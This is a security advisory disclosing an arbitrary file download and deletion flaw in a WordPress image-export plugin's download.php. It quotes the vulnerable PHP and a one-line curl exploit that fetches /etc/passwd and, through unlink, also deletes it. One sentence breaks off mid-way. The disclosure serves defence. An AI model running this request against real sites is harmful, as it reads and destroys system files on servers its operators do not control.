Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-01
Vendor: www.1efthander.com
Vendor Notified: 2015-07-05
Vendor Contact: https://twitter.com/1eftHander
Description: Image Export plugin can help you selectively download images uploaded by an administrator .
Vulnerability:
The code in file download.php doesn&#039;t do any checking that the user is requesting files from the uploaded images directory only.  And line 8 attempts to
 
      1 <?php
      2 if ( isset( $_REQUEST[&#039;file&#039;] ) && !empty( $_REQUEST[&#039;file&#039;] ) ) {
      3         $file = $_GET[&#039;file&#039;];
      4 
      5         header( &#039;Content-Type: application/zip&#039; );
      6         header( &#039;Content-Disposition: attachment; filename="&#039; . $file . &#039;"&#039; );
      7         readfile( $file );
      8         unlink( $file );
      9         
     10         exit;
     11 }
     12 ?>
CVEID: TBD
Exploit Code:
  â€¢ $ curl http://example.com/wp-content/plugins/image-export/download.php?file=/etc/passwd
Screen Shots:
Advisory: http://www.vapid.dhs.org/advisory.php?v=135

